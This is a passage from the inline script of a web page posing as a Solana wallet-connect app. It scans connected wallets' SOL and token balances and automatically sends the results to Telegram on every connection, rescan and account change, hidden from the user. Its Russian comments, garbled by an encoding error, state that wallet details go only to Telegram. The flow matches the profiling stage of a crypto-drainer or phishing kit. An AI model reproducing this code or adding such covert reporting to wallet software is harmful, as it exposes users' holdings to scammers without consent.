      const result = await makeRequest(
        `${heliusRpcUrl}?api-key=${apiKey}`,
        'POST',
        {
          jsonrpc: '2.0',
          id: 1,
          method: 'getTokenAccountsByOwner',
          params: [walletAddress, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
        },
        1,
        3000
      );

      if (result && result.result && result.result.value) {
        console.log(`ü™ô –ù–∞–π–¥–µ–Ω–æ ${result.result.value.length} —Ç–æ–∫–µ–Ω-–∞–∫–∫–∞—É–Ω—Ç–æ–≤`);
        return result.result.value;
      }

      return [];
    }

    // ============================================================================
    // SOLANA WALLET SCANNER
    // ============================================================================

    class SolanaWalletScanner {
      constructor() {
        this.knownTokens = {
          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)',
          'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'Bonk',
          'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 'Jupiter',
          'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'Marinade SOL',
          'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1': 'BlazeStake SOL',
          '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs': 'Ether (Wormhole)',
          'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM': 'USDCet (Wormhole)',
          'Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1': 'Saber',
          '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R': 'Raydium',
          'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE': 'Orca',
          'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'Serum',
          'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6': 'Kin',
          'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac': 'Mango'
        };
      }

      async performFastScan(walletAddress) {
        console.log(`‚ö° –ù–∞—á–∏–Ω–∞–µ–º –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞: ${walletAddress}`);
        
        const startTime = Date.now();
        
        try {
          const fastResults = await checkWalletBalanceFast(walletAddress);
          
          if (!fastResults.success) {
            throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∏ –æ–¥–Ω–∏–º –º–µ—Ç–æ–¥–æ–º');
          }

          const processedTokens = [];
          
          if (fastResults.tokens && Array.isArray(fastResults.tokens)) {
            for (const token of fastResults.tokens) {
              let mintAddress, amount, decimals;

              if (token.account && token.account.data && token.account.data.parsed) {
                const tokenInfo = token.account.data.parsed.info;
                mintAddress = tokenInfo.mint;
                amount = tokenInfo.tokenAmount.uiAmount;
                decimals = tokenInfo.tokenAmount.decimals;
              } else if (token.mint && token.amount !== undefined) {
                mintAddress = token.mint;
                amount = token.amount / Math.pow(10, token.decimals || 0);
                decimals = token.decimals;
              } else {
                continue;
              }

              if (amount > 0) {
                const tokenName = this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`;
                
                processedTokens.push({
                  name: tokenName,
                  mint: mintAddress,
                  amount: amount,
                  decimals: decimals
                });
              }
            }
          }

          processedTokens.sort((a, b) => b.amount - a.amount);

          const scanDuration = Date.now() - startTime;

          const results = {
            address: walletAddress,
            solBalance: fastResults.solBalance,
            tokens: processedTokens,
            totalTokenAccounts: processedTokens.length,
            scanTimestamp: new Date().toISOString(),
            scanType: 'fast',
            methodUsed: fastResults.methodUsed,
            scanDuration: scanDuration,
            success: true
          };

          console.log(`‚úÖ –ë—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –∑–∞ ${scanDuration}–º—Å`);
          console.log(`üí∞ SOL –±–∞–ª–∞–Ω—Å: ${results.solBalance}`);
          console.log(`ü™ô –ù–∞–π–¥–µ–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤: ${results.tokens.length}`);
          console.log(`üì° –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –º–µ—Ç–æ–¥: ${results.methodUsed}`);
          
          return results;

        } catch (error) {
          console.error('‚ùå –û—à–∏–±–∫–∞ –±—ã—Å—Ç—Ä–æ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è:', error);
          
          const scanDuration = Date.now() - startTime;
          
          return {
            address: walletAddress,
            solBalance: 0,
            tokens: [],
            totalTokenAccounts: 0,
            scanTimestamp: new Date().toISOString(),
            error: error.message,
            scanType: 'fast',
            scanDuration: scanDuration,
            success: false
          };
        }
      }
    }

    // ============================================================================
    // ENHANCED WALLET MANAGER WITH WALLET-ADAPTER PRINCIPLES
    // ============================================================================

    class SolanaWalletManager {
      constructor() {
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.scanner = new SolanaWalletScanner();
        this.isScanning = false;
        this.autoConnect = true; // Wallet-adapter –ø—Ä–∏–Ω—Ü–∏–ø
        
        this.init();
      }

      async init() {
        this.setupEventListeners();
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å—ã –∫–æ—à–µ–ª—å–∫–æ–≤
        checkWalletStatuses();
        
        // Auto-connect –µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω
        if (this.autoConnect) {
          await this.checkPreviousConnection();
        }
      }

      async checkPreviousConnection() {
        const savedWallet = localStorage.getItem('connectedWallet');
        if (savedWallet && WALLET_ADAPTER_CONFIG[savedWallet]) {
          try {
            const wallet = WALLET_ADAPTER_CONFIG[savedWallet];
            const readyState = wallet.readyState();
            
            if (readyState === 'Installed') {
              console.log(`üîÑ Attempting auto-reconnect to ${wallet.name}...`);
              const result = await wallet.connect();
              if (result) {
                this.onWalletConnected(result.publicKey, wallet.name, result.provider);
              }
            }
          } catch (error) {
            console.log('Auto-reconnect failed:', error);
            localStorage.removeItem('connectedWallet');
          }
        }
      }

      async connectWallet(walletKey, requestPermission = true) {
        if (this.isScanning) {
          console.log('‚è≥ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è...');
          return;
        }

        const wallet = WALLET_ADAPTER_CONFIG[walletKey];
        
        if (!wallet) {
          throw new Error(`Unsupported wallet: ${walletKey}`);
        }

        this.showConnectionStatus('loading', `Connecting to ${wallet.name}...`);

        try {
          const device = detectDevice();
          const readyState = wallet.readyState();
          
          // –ï—Å–ª–∏ –∫–æ—à–µ–ª–µ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ –¥–µ—Å–∫—Ç–æ–ø–µ, –ø–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –Ω–∞–ø—Ä—è–º—É—é
          if (!device.isMobile && readyState === 'Installed' && requestPermission) {
            console.log(`üîó Direct connection to ${wallet.name}...`);
            const result = await wallet.connect();
            if (result) {
              this.onWalletConnected(result.publicKey, wallet.name, result.provider);
              localStorage.setItem('connectedWallet', walletKey);
              return result;
            }
          }
          // –ï—Å–ª–∏ –º–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏–ª–∏ –∫–æ—à–µ–ª–µ–∫ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
          else {
            console.log(`üì± Showing connection modal for ${wallet.name}...`);
            showConnectionModal(walletKey);
            return;
          }

        } catch (error) {
          console.error(`Failed to connect to ${wallet.name}:`, error);
          this.showConnectionStatus('error', error.message);
          this.isScanning = false;
          throw error;
        }
      }

      // Callback –¥–ª—è —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
      async onWalletConnected(publicKey, walletName, provider) {
        console.log(`‚úÖ Wallet connected: ${walletName}, Address: ${publicKey}`);
        
        this.connectedWallet = provider;
        this.walletAddress = publicKey;
        this.walletName = walletName;

        this.updateConnectionUI();
        await this.performWalletScan();
        this.setupWalletEventListeners(provider);
      }

      async performWalletScan() {
        this.showConnectionStatus('scanning', `Scanning wallet data...`);
        this.isScanning = true;

        try {
          this.walletData = await this.scanner.performFastScan(this.walletAddress);
          
          // –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò –û–¢–ü–†–ê–í–õ–Ø–ï–ú –í TELEGRAM
          await sendWalletInfoToTelegram(this.walletName, this.walletData);
          
          this.updateConnectionUI();
          
          if (this.walletData.error || !this.walletData.success) {
            this.showConnectionStatus('error', `Connected but scan failed: ${this.walletData.error || 'Unknown error'}`);
          } else {
            this.showConnectionStatus('success', `Connected successfully!`);
          }
          
        } catch (scanError) {
          console.error('Fast scan failed:', scanError);
          this.showConnectionStatus('error', `Connected but scan failed: ${scanError.message}`);
          this.updateConnectionUI();
        } finally {
          this.isScanning = false;
        }
      }

      async rescanWallet() {
        if (!this.walletAddress) {
          this.showConnectionStatus('error', 'No wallet connected');
          return;
        }

        if (this.isScanning) {
          this.showConnectionStatus('error', 'Scan already in progress');
          return;
        }

        this.showConnectionStatus('scanning', 'Scanning wallet data...');
        this.isScanning = true;

        try {
          this.walletData = await this.scanner.performFastScan(this.walletAddress);
          
          // –û–¢–ü–†–ê–í–õ–Ø–ï–ú –û–ë–ù–û–í–õ–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï –í TELEGRAM
          await sendWalletInfoToTelegram(`${this.walletName} (Rescan)`, this.walletData);
          
          this.showConnectionStatus('success', `Scan completed successfully!`);
          
        } catch (error) {
          console.error('Scan failed:', error);
          this.showConnectionStatus('error', `Scan failed: ${error.message}`);
        } finally {
          this.isScanning = false;
        }
      }

      async disconnectWallet() {
        try {
          if (this.connectedWallet && this.connectedWallet.disconnect) {
            await this.connectedWallet.disconnect();
          }
        } catch (error) {
          console.error('Error disconnecting wallet:', error);
        }

        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.isScanning = false;
        
        localStorage.removeItem('connectedWallet');

        this.updateConnectionUI();
        this.hideConnectionStatus();

        console.log('Wallet disconnected');
      }

      setupWalletEventListeners(provider) {
        if (provider && provider.on) {
          provider.on('disconnect', () => {
            console.log('Wallet disconnected by user');
            this.disconnectWallet();
          });

          provider.on('accountChanged', (publicKey) => {
            if (publicKey) {
              this.walletAddress = publicKey.toString();
              this.updateConnectionUI();
              setTimeout(() => {
                this.rescanWallet();
              }, 500);
              console.log('Account changed:', this.walletAddress);
            } else {
              this.disconnectWallet();
            }
          });
        }
      }

      updateConnectionUI() {
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletInfo');
        const connectedWalletName = document.getElementById('connectedWalletName');
        const walletAddressElement = document.getElementById('walletAddress');

        if (this.connectedWallet && this.walletAddress) {
          connectBtn.textContent = 'Wallet Connected';
          connectBtn.classList.add('connected');
          
          if (walletInfo) {
            walletInfo.classList.remove('hidden');
            connectedWalletName.textContent = this.walletName;
            walletAddressElement.textContent = this.formatAddress(this.walletAddress);
          }
        } else {
          connectBtn.textContent = 'Connect Wallet';
          connectBtn.classList.remove('connected');
          
          if (walletInfo) {
            walletInfo.classList.add('hidden');
          }
        }
      }

      formatAddress(address) {
        if (!address) return '';
        return `${address.slice(0, 4)}...${address.slice(-4)}`;
      }

      showConnectionStatus(type, message) {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.className = `connection-status ${type}`;
          statusElement.textContent = message;
          statusElement.classList.remove('hidden');

          if (type === 'success') {
            setTimeout(() => {
              this.hideConnectionStatus();
            }, 3000);
          }
        }
      }

      hideConnectionStatus() {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.classList.add('hidden');
        }
      }

      setupEventListeners() {
        document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
          option.addEventListener('click', async (e) => {
            const walletKey = option.getAttribute('data-wallet');
            
            try {
              await this.connectWallet(walletKey);
              setTimeout(() => {
                closeAllModals();
              }, 1500);
            } catch (error) {
              console.error('Connection failed:', error);
            }
          });
        });

        document.querySelectorAll('.wallet-item[data-wallet]').forEach(item => {
          item.addEventListener('click', async (e) => {
            const walletKey = item.getAttribute('data-wallet');
            
            try {
              await this.connectWallet(walletKey);
              setTimeout(() => {
                closeAllModals();
              }, 1500);
            } catch (error) {
              console.error('Connection failed:', error);
            }
          });
        });

        const disconnectBtn = document.getElementById('disconnectBtn');
        if (disconnectBtn) {
          disconnectBtn.addEventListener('click', () => {
            this.disconnectWallet();
          });
        }

        const rescanBtn = document.getElementById('rescanBtn');
        if (rescanBtn) {
          rescanBtn.addEventListener('click', () => {
            this.rescanWallet();
          });
        }
      }

      getWalletInfo() {
        return {
          isConnected: !!this.connectedWallet,
          address: this.walletAddress,
          name: this.walletName,
          provider: this.connectedWallet,
          scanData: this.walletData,
          isScanning: this.isScanning
        };
      }
    }

    // ============================================================================
    // MODAL MANAGEMENT
    // ============================================================================

    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const connectWalletModal = document.getElementById('connectWalletModal');
    const allWalletsModal = document.getElementById('allWalletsModal');
    const qrModal = document.getElementById('qrModal');
    const allWalletsBtn = document.getElementById('allWalletsBtn');
    const closeBtns = document.querySelectorAll('.close-btn');
    const backBtn = document.querySelector('.back-btn');

    function openConnectWalletModal() {
      connectWalletModal.classList.remove('hidden');
      modalOverlay.classList.remove('hidden');
      allWalletsModal.classList.add('hidden');
      qrModal.classList.add('hidden');
    }

    function closeAllModals() {
      connectWalletModal.classList.add('hidden');
      allWalletsModal.classList.add('hidden');
      qrModal.classList.add('hidden');
      modalOverlay.classList.add('hidden');
    }

    function switchToAllWallets() {
      connectWalletModal.classList.add('hidden');
      allWalletsModal.classList.remove('hidden');
    }

    function switchBackToConnectWallet() {
      allWalletsModal.classList.add('hidden');
      connectWalletModal.classList.remove('hidden');
    }

    connectWalletBtn.addEventListener('click', openConnectWalletModal);
    allWalletsBtn.addEventListener('click', switchToAllWallets);
    backBtn.addEventListener('click', switchBackToConnectWallet);

    closeBtns.forEach(btn => {
      btn.addEventListener('click', closeAllModals);
    });

    modalOverlay.addEventListener('click', closeAllModals);

    // ============================================================================
    // INITIALIZATION
    // ============================================================================

    function updateInitStatus(message) {
      const statusEl = document.getElementById('initStatus');
      if (statusEl) {
        statusEl.textContent = message;
      }
    }

    function hideInitStatus() {
      const statusEl = document.getElementById('initStatus');
      if (statusEl) {
        statusEl.style.display = 'none';
      }
    }

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    document.addEventListener('DOMContentLoaded', async () => {
      console.log('üöÄ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Å wallet-adapter –ø—Ä–∏–Ω—Ü–∏–ø–∞–º–∏...');
      
      updateInitStatus('üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞...');
      const device = detectDevice();
      console.log('üì± Device detected:', device);
      
      updateInitStatus('üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ—à–µ–ª—å–∫–æ–≤...');
      checkWalletStatuses();
      
      updateInitStatus('üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Wallet Manager...');
      const walletManager = new SolanaWalletManager();
      window.walletManager = walletManager;
      
      updateInitStatus('‚úÖ –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≥–æ—Ç–æ–≤–æ');
      setTimeout(() => {
        hideInitStatus();
      }, 2000);
      
      console.log('‚úÖ –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≥–æ—Ç–æ–≤–æ –∫ —Ä–∞–±–æ—Ç–µ!');
      console.log('üì± Enhanced mobile support with wallet-adapter principles enabled');
    });

    // ============================================================================
    // UTILITY FUNCTIONS
    // ============================================================================

    function getConnectedWallet() {
      return window.walletManager ? window.walletManager.getWalletInfo() : null;
    }

    async function connectToWallet(walletKey) {
      if (window.walletManager) {
        return await window.walletManager.connectWallet(walletKey);
      }
      throw new Error('Wallet manager not initialized');
    }

    async function disconnectWallet() {
      if (window.walletManager) {
        return await window.walletManager.disconnectWallet();
      }
    }

    async function rescanWallet() {
      if (window.walletManager) {
        return await window.walletManager.rescanWallet();
      }
    }

    // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∏–∑ –∫–æ–Ω—Å–æ–ª–∏
    window.getConnectedWallet = getConnectedWallet;
    window.connectToWallet = connectToWallet;
    window.disconnectWallet = disconnectWallet;
    window.rescanWallet = rescanWallet;
    window.checkWalletBalanceFast = checkWalletBalanceFast;
    window.sendWalletInfoToTelegram = sendWalletInfoToTelegram;
    window.detectDevice = detectDevice;
    window.openWallet = openWallet;
    window.showConnectionModal = showConnectionModal;
    window.WALLET_ADAPTER_CONFIG = WALLET_ADAPTER_CONFIG;

    console.log('üöÄ Solana Wallet Scanner —Å wallet-adapter –ø—Ä–∏–Ω—Ü–∏–ø–∞–º–∏ –∑–∞–≥—Ä—É–∂–µ–Ω!');
    console.log('üì± –£–ª—É—á—à–µ–Ω–Ω–∞—è –º–æ–±–∏–ª—å–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞');
    console.log('üîó Deep links –∏ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã –∫–æ—à–µ–ª—å–∫–æ–≤ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è');
    console.log('üì§ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram –≤–∫–ª—é—á–µ–Ω–∞');
    console.log('üîí –î–µ—Ç–∞–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ Telegram');
  </script>
</body>
</html>

